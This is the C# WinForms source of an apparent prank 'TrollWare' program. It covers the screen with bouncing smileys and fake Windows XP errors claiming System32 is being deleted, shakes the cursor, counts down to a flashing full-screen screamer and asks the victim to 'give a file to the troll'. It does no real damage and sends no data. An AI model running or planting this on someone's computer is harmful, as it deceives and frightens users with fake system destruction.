using System;
using System.Drawing;
using System.Media;
using System.Windows.Forms;

namespace Smiley
{
    public partial class Form1 : Form
    {
        private int timeLeft = 107; // 1 минута 47 секунд
        private SoundPlayer bgMusic;
        private SoundPlayer errorSound;
        private Random rand = new Random();
        private bool isScreamerActive = false;

        private Form flyingSmileyForm;
        private Point flyingSmileyVelocity = new Point(10, 8);
        private Point currentVelocity = new Point(7, 7);

        private Timer mainTimer;
        private Timer motionTimer;
        private Timer rainbowTimer;
        private Timer popupTimer;
        private Timer xpDialogTimer;
        private Timer screamerTimer;
        private Timer cursorJitterTimer;

        private int colorStep = 0;
        private Color[] retroColors = new Color[]
        {
            Color.Red, Color.Yellow, Color.Crimson, Color.Orange, Color.Lime, Color.Cyan, Color.Magenta
        };

        public Form1()
        {
            InitializeComponent();
            this.KeyPreview = true;
            this.DoubleBuffered = true;
            this.TopMost = true;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.TopMost = true;
            this.Activate();
            this.BringToFront();

            // Воспроизведение звуков из ресурсов памяти
            try
            {
                bgMusic = new SoundPlayer(Properties.Resources.Music);
                bgMusic.PlayLooping();
            }
            catch { }

            try
            {
                errorSound = new SoundPlayer(Properties.Resources.error);
            }
            catch { }

            CreateFlyingSmiley();

            mainTimer = new Timer { Interval = 1000 };
            mainTimer.Tick += MainTimer_Tick;
            mainTimer.Start();

            motionTimer = new Timer { Interval = 20 };
            motionTimer.Tick += MotionTimer_Tick;
            motionTimer.Start();

            rainbowTimer = new Timer { Interval = 90 };
            rainbowTimer.Tick += RainbowTimer_Tick;
            rainbowTimer.Start();

            popupTimer = new Timer { Interval = 650 };
            popupTimer.Tick += PopupTimer_Tick;
            popupTimer.Start();

            xpDialogTimer = new Timer { Interval = 2000 };
            xpDialogTimer.Tick += XpDialogTimer_Tick;
            xpDialogTimer.Start();

            cursorJitterTimer = new Timer { Interval = 120 };
            cursorJitterTimer.Tick += CursorJitterTimer_Tick;
            cursorJitterTimer.Start();

            screamerTimer = new Timer { Interval = 25 };
            screamerTimer.Tick += ScreamerTimer_Tick;

            UpdateTimerDisplay();
        }

        private void CreateFlyingSmiley()
        {
            int size = 170;
            int screenW = Screen.PrimaryScreen.Bounds.Width;
            int screenH = Screen.PrimaryScreen.Bounds.Height;

            flyingSmileyForm = new Form
            {
                FormBorderStyle = FormBorderStyle.None,
                StartPosition = FormStartPosition.Manual,
                ShowInTaskbar = false,
                TopMost = true,
                Size = new Size(size, size),
                Location = new Point(rand.Next(50, screenW - size), rand.Next(50, screenH - size)),
                BackColor = Color.Black,
                TransparencyKey = Color.Black
            };

            PictureBox pb = new PictureBox
            {
                Image = Properties.Resources.Smiley,
                SizeMode = PictureBoxSizeMode.Zoom,
                Dock = DockStyle.Fill,
                BackColor = Color.Transparent
            };

            flyingSmileyForm.Controls.Add(pb);
            flyingSmileyForm.Show();
        }

        private void MainTimer_Tick(object sender, EventArgs e)
        {
            if (timeLeft > 0)
            {
                timeLeft--;
                UpdateTimerDisplay();
            }
            else
            {
                StartScreamer();
            }
        }

        private void UpdateTimerDisplay()
        {
            TimeSpan time = TimeSpan.FromSeconds(timeLeft);
            TimerLabel.Text = time.ToString(@"mm\:ss");
        }

        private void MotionTimer_Tick(object sender, EventArgs e)
        {
            if (isScreamerActive) return;

            if (!this.TopMost) this.TopMost = true;

            int screenW = Screen.PrimaryScreen.WorkingArea.Width;
            int screenH = Screen.PrimaryScreen.WorkingArea.Height;

            int newX = this.Location.X + currentVelocity.X;
            int newY = this.Location.Y + currentVelocity.Y;

            if (newX <= 0 || newX + this.Width >= screenW)
            {
                currentVelocity.X = -currentVelocity.X;
                SystemSounds.Hand.Play();
            }

            if (newY <= 0 || newY + this.Height >= screenH)
            {
                currentVelocity.Y = -currentVelocity.Y;
            }

            this.Location = new Point(
                Math.Max(0, Math.Min(screenW - this.Width, newX)),
                Math.Max(0, Math.Min(screenH - this.Height, newY))
            );

            if (flyingSmileyForm != null && !flyingSmileyForm.IsDisposed)
            {
                int smX = flyingSmileyForm.Location.X + flyingSmileyVelocity.X;
                int smY = flyingSmileyForm.Location.Y + flyingSmileyVelocity.Y;

                if (smX <= 0 || smX + flyingSmileyForm.Width >= Screen.PrimaryScreen.Bounds.Width)
                {
                    flyingSmileyVelocity.X = -flyingSmileyVelocity.X;
                }

                if (smY <= 0 || smY + flyingSmileyForm.Height >= Screen.PrimaryScreen.Bounds.Height)
                {
                    flyingSmileyVelocity.Y = -flyingSmileyVelocity.Y;
                }

                flyingSmileyForm.Location = new Point(
                    Math.Max(0, Math.Min(Screen.PrimaryScreen.Bounds.Width - flyingSmileyForm.Width, smX)),
                    Math.Max(0, Math.Min(Screen.PrimaryScreen.Bounds.Height - flyingSmileyForm.Height, smY))
                );
            }
        }

        private void RainbowTimer_Tick(object sender, EventArgs e)
        {
            if (isScreamerActive) return;

            colorStep = (colorStep + 1) % retroColors.Length;
            Color currentColor = retroColors[colorStep];

            if (LockOutLabel != null) LockOutLabel.ForeColor = currentColor;
            if (OopsLabel != null) OopsLabel.ForeColor = retroColors[(colorStep + 3) % retroColors.Length];

            if (GiveUpButton != null)
            {
                GiveUpButton.BackColor = (colorStep % 2 == 0) ? Color.DarkRed : Color.Black;
                GiveUpButton.ForeColor = Color.Yellow;
            }

            if (rand.Next(0, 10) == 0)
            {
                this.BackColor = (this.BackColor == Color.Red) ? Color.DarkRed : Color.Red;
            }
        }

        private void PopupTimer_Tick(object sender, EventArgs e)
        {
            if (isScreamerActive) return;

            int size = rand.Next(140, 240);
            int screenW = Screen.PrimaryScreen.Bounds.Width;
            int screenH = Screen.PrimaryScreen.Bounds.Height;

            int startX = rand.Next(0, Math.Max(1, screenW - size));
            int startY = rand.Next(0, Math.Max(1, screenH - size));

            for (int i = 0; i < 3; i++)
            {
                Form trailForm = new Form
                {
                    FormBorderStyle = FormBorderStyle.None,
                    StartPosition = FormStartPosition.Manual,
                    ShowInTaskbar = false,
                    TopMost = true,
                    Size = new Size(size, size),
                    Location = new Point(startX + (i * 20), startY + (i * 20)),
                    BackColor = Color.Black,
                    TransparencyKey = Color.Black
                };

                PictureBox pb = new PictureBox
                {
                    Image = Properties.Resources.Smiley,
                    SizeMode = PictureBoxSizeMode.Zoom,
                    Dock = DockStyle.Fill,
                    BackColor = Color.Transparent
                };

                trailForm.Controls.Add(pb);
                trailForm.Show();
                trailForm.BringToFront();

                int delay = 450 + (i * 120);
                Timer fadeTimer = new Timer { Interval = delay };
                fadeTimer.Tick += (s, ev) =>
                {
                    fadeTimer.Stop();
                    fadeTimer.Dispose();
                    trailForm.Close();
                    trailForm.Dispose();
                };
                fadeTimer.Start();
            }
        }

        private void XpDialogTimer_Tick(object sender, EventArgs e)
        {
            if (isScreamerActive) return;

            string[] xpMessages = {
                "System Error: 0x000000F",
                "Smiley.exe has stopped working",
                "Critical Warning: BRAIN_NOT_FOUND",
                "TrollWare XP: SYSTEM DESTROYED!",
                "Deleting C:\\Windows\\System32... 99%"
            };

            Form xpError = new Form
            {
                Text = "Windows XP System Error",
                Size = new Size(290, 130),
                FormBorderStyle = FormBorderStyle.FixedDialog,
                MaximizeBox = false,
                MinimizeBox = false,
                StartPosition = FormStartPosition.Manual,
                TopMost = true,
                ShowInTaskbar = false,
                BackColor = SystemColors.Control
            };

            int screenW = Screen.PrimaryScreen.Bounds.Width;
            int screenH = Screen.PrimaryScreen.Bounds.Height;
            xpError.Location = new Point(rand.Next(40, screenW - 310), rand.Next(40, screenH - 150));

            Label lbl = new Label
            {
                Text = xpMessages[rand.Next(xpMessages.Length)],
                Location = new Point(18, 18),
                AutoSize = true,
                Font = new Font("Tahoma", 8.5f, FontStyle.Bold)
            };

            Button btn = new Button
            {
                Text = "OK",
                Location = new Point(100, 52),
                Size = new Size(75, 25)
            };

            btn.Click += (s, ev) => xpError.Close();

            xpError.Controls.Add(lbl);
            xpError.Controls.Add(btn);
            xpError.Show();
            xpError.BringToFront();

            SystemSounds.Asterisk.Play();

            Timer autoClose = new Timer { Interval = 2200 };
            autoClose.Tick += (s, ev) =>
            {
                autoClose.Stop();
                autoClose.Dispose();
                if (!xpError.IsDisposed) xpError.Close();
            };
            autoClose.Start();
        }

        private void CursorJitterTimer_Tick(object sender, EventArgs e)
        {
            if (isScreamerActive) return;
            Cursor.Position = new Point(
                Cursor.Position.X + rand.Next(-7, 8),
                Cursor.Position.Y + rand.Next(-7, 8)
            );
        }

        private void GiveUpButton_Click(object sender, EventArgs e)
        {
            StartScreamer();
        }

        private void GiveFileButton_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Выберите файл для передачи троллю";
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    CloseFlyingSmiley();
                    bgMusic?.Stop();
                    if (errorSound != null)
                    {
                        errorSound.PlaySync();
                    }
                    Application.Exit();
                }
            }
        }

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.F)
            {
                CloseFlyingSmiley();
                bgMusic?.Stop();
                Application.Exit();
            }
        }

        private void CloseFlyingSmiley()
        {
            if (flyingSmileyForm != null && !flyingSmileyForm.IsDisposed)
            {
                flyingSmileyForm.Close();
                flyingSmileyForm.Dispose();
            }
        }

        private void StartScreamer()
        {
            if (isScreamerActive) return;

            isScreamerActive = true;
            CloseFlyingSmiley();

            mainTimer.Stop();
            motionTimer.Stop();
            rainbowTimer.Stop();
            popupTimer.Stop();
            xpDialogTimer.Stop();
            cursorJitterTimer.Stop();

            this.FormBorderStyle = FormBorderStyle.None;
            this.WindowState = FormWindowState.Maximized;
            this.TopMost = true;
            this.BringToFront();

            screamerTimer.Start();
        }

        private void ScreamerTimer_Tick(object sender, EventArgs e)
        {
            Image img = Properties.Resources.Smiley;

            for (int i = 0; i < 5; i++)
            {
                int size = rand.Next(180, 450);
                PictureBox pb = new PictureBox
                {
                    Image = img,
                    SizeMode = PictureBoxSizeMode.Zoom,
                    Size = new Size(size, size),
                    Location = new Point(rand.Next(-40, this.Width), rand.Next(-40, this.Height)),
                    BackColor = Color.Transparent
                };

                this.Controls.Add(pb);
                pb.BringToFront();
            }

            this.BackColor = (rand.Next(0, 2) == 0) ? Color.Red : Color.Black;
        }
    }
}